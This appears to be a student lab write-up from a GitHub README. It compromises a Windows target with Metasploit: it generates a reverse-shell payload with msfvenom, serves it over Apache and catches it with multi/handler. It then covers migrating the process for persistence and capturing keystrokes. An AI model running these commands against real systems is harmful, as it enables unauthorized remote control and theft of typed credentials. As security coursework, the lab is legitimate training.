# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:
Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/user-attachments/assets/74db2e12-b5c1-4a5e-922f-2382ac5658e7)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/user-attachments/assets/5de4f8a7-e902-4534-b25f-60ac6cf2487a)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/user-attachments/assets/a8ce006e-a938-4e37-9ec4-19180fafc6e0)

Start apache server sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/user-attachments/assets/23cf2b47-596c-4724-8ca3-852b2b143362)

Check the status of apache2

## OUTPUT:
![image](https://github.com/user-attachments/assets/a19f616a-4759-4bce-ba00-b04aeac056a1)

Invoke msfconsole:

## OUTPUT:
![image](https://github.com/user-attachments/assets/9d4e49b9-0494-463a-81f2-6267e152f938)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/user-attachments/assets/7bf01fd5-3fb3-40f8-ac55-340227c29832)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/user-attachments/assets/092b4542-c4af-4a0f-b648-8e1ddd1468e9)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/655726a4-b159-4cad-9547-a98dd5ee6fde)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/user-attachments/assets/b4fe75ff-0114-4244-a9f2-6613643e0aa2)

On kali give the command exploit

![image](https://github.com/user-attachments/assets/276c091d-1a22-4fdf-b9c8-ab88846d717b)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/57a353ca-0837-4ce4-8c1c-02e045039442)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/user-attachments/assets/82bf7230-4c83-4017-b369-6d7b99ead749)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/fa1fd744-98da-4410-8d6f-4fee60c6438d)
![image](https://github.com/user-attachments/assets/cf255f6f-5a4e-421b-9907-c1c0d63d81b9)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/282c022c-bfa0-4507-8716-a847d6301ad9)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
